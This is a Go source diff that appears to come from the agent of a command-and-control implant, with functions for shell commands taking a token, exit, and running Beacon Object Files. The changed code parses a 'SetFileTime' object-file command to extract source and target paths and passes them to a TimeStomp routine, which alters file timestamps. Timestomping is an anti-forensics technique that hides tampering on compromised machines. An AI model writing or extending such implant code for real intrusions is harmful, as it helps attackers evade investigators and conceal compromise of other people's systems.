@@ -17,6 +17,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"unicode"
 )
 
 func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
@@ -346,10 +347,32 @@ func CmdExit() ([]byte, error) {
 
 func CMDBof(cmdBuf []byte) ([]byte, error) {
 	if bytes.Contains(cmdBuf, []byte("SetFileTime")) {
-		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte(""))
-		buffers := bytes.Split(cmdBuf, []byte("\r"))
-		buffers = bytes.Split(buffers[len(buffers)-1], []byte("\n"))
-		return packet.TimeStomp(buffers[0], buffers[1])
+		var temp []byte
+		for _, value := range cmdBuf {
+			if unicode.IsPrint(rune(value)) || value == byte(0) {
+				temp = append(temp, value)
+			}
+		}
+		buffers := bytes.Split(temp, []byte("CloseHandle"))
+		buffers = bytes.Split(buffers[len(buffers)-1], []byte("\x00\x00\x00\x00"))
+		if len(buffers) < 2 {
+			return nil, errors.New("Something wrong with timestomp function.")
+		}
+		from := bytes.ReplaceAll(buffers[len(buffers)-1], []byte("\x00"), []byte(""))
+		to := bytes.ReplaceAll(buffers[len(buffers)-2], []byte("\x00"), []byte(""))
+		if bytes.Index(from, []byte(":")) != -1 {
+			from = from[bytes.LastIndex(from, []byte(":"))-1:]
+		}
+		if bytes.Index(to, []byte(":")) != -1 {
+			to = to[bytes.LastIndex(to, []byte(":"))-1:]
+		}
+		if bytes.Index(from, []byte("../")) != -1 {
+			from = from[bytes.Index(from, []byte("../")):]
+		}
+		if bytes.Index(to, []byte("../")) != -1 {
+			to = to[bytes.Index(to, []byte("../")):]
+		}
+		return packet.TimeStomp(from, to)
 	}
 	return []byte("This function is not supported now."), nil
 }
